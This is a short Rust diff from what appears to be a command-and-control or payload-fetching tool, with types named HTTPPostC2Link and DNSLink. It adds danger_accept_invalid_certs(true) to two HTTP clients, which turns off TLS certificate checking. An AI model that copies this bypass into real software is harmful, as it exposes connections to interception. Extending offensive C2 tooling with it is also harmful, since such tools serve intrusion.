@@ -412,6 +412,7 @@ impl LinkFetch for DNSLink {
 impl LinkFetch for HTTPLink {
     fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
         let client = reqwest::blocking::Client::builder()
+            .danger_accept_invalid_certs(true)
             .timeout(Duration::from_secs(config.link_timeout))
             .user_agent(&config.link_user_agent)
             .build()?;
@@ -545,6 +546,7 @@ impl LinkFetch for HTTPPostC2Link {
             apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;
 
         let client = reqwest::blocking::Client::builder()
+            .danger_accept_invalid_certs(true)
             .timeout(Duration::from_secs(config.link_timeout))
             .user_agent(&config.link_user_agent)
             .build()?;
